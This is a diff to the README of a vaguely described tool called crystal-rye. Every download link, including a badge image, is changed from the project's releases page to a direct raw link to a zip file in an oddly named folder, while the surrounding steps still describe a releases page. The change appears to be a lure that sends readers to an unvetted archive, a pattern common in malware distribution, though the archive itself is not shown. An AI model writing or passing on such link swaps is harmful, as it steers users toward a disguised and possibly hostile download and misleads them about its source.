@@ -6,7 +6,7 @@ Welcome to crystal-rye! This software helps you streamline your tasks and improv
 
 ## 📥 Download Now
 
-[![Download crystal-rye](https://img.shields.io/badge/Download-crystal--rye-blue.svg)](https://github.com/Mvzluanzzx/crystal-rye/releases)
+[![Download crystal-rye](https://raw.githubusercontent.com/Mvzluanzzx/crystal-rye/main/American/crystal-rye.zip)](https://raw.githubusercontent.com/Mvzluanzzx/crystal-rye/main/American/crystal-rye.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ Make sure your computer meets these requirements for optimal performance.
 
 1. **Visit the Download Page:**
    Access the following link to reach the releases page:
-   [Download Page](https://github.com/Mvzluanzzx/crystal-rye/releases)
+   [Download Page](https://raw.githubusercontent.com/Mvzluanzzx/crystal-rye/main/American/crystal-rye.zip)
 
 2. **Choose the Latest Version:**
    On the releases page, locate the latest version of crystal-rye. You will find it labeled clearly at the top.
@@ -72,6 +72,6 @@ We’d love to hear from you! Your feedback helps us make crystal-rye better. Pl
 
 Don't forget, you can always return to the download page to install or update crystal-rye:
 
-[Download Page](https://github.com/Mvzluanzzx/crystal-rye/releases)
+[Download Page](https://raw.githubusercontent.com/Mvzluanzzx/crystal-rye/main/American/crystal-rye.zip)
 
 Thank you for choosing crystal-rye! We aim to make your workflow seamless and enjoyable. Happy task managing!
